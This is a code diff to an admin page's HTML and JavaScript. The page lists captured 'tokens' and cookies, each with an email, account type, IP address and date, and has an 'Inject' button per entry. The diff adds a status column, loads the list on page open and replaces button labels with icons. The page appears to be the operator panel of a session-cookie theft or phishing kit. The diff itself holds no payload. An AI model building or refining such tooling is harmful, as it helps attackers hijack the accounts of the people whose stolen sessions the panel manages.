@@ -35,6 +35,7 @@
                             <th>Email</th>
                             <th>Type</th>
                             <th>Account</th>
+                            <th>Status</th>
                             <th>IP</th>
                             <th>Date</th>
                             <th>Actions</th>
@@ -68,6 +69,7 @@
     <script src="assets/js/admin.js"></script>
     <script>
         initAdminShared('tokens');
+        loadTokens();
 
         async function loadTokens() {
             const search = document.getElementById('searchInput').value;
@@ -85,12 +87,18 @@
                     <td>${t.email || '—'}</td>
                     <td><span class="badge">${t.token_type === 'cookie' ? 'COOKIE' : 'TOKEN'}</span></td>
                     <td>${t.account_type || '—'}</td>
-                    <td>${t.ip_address || '—'}</td>
-                    <td>${new Date(t.created_at).toLocaleString()}</td>
+                    <td>
+                        <span class="status-badge-enhanced ${t.token_status || 'unknown'}">
+                            <span class="dot"></span>
+                            ${(t.token_status || 'unknown').toUpperCase()}
+                        </span>
+                    </td>
+                    <td style="font-size:11px;color:var(--muted);font-family:var(--font-mono);">${t.ip_address || '—'}</td>
+                    <td style="font-size:11px;color:var(--muted);">${new Date(t.created_at).toLocaleString()}</td>
                     <td>
                         <div style="display:flex;gap:4px;">
-                            <button class="btn-sm" onclick="injectCookie(${t.id})" title="Inject">Inject</button>
-                            <button class="btn-sm danger" onclick="deleteToken(${t.id})" title="Delete">Delete</button>
+                            <button class="btn-sm" onclick="injectCookie(${t.id})" title="Inject"><i class="fas fa-plug"></i></button>
+                            <button class="btn-sm danger" onclick="deleteToken(${t.id})" title="Delete"><i class="fas fa-trash"></i></button>
                         </div>
                     </td>
                 </tr>
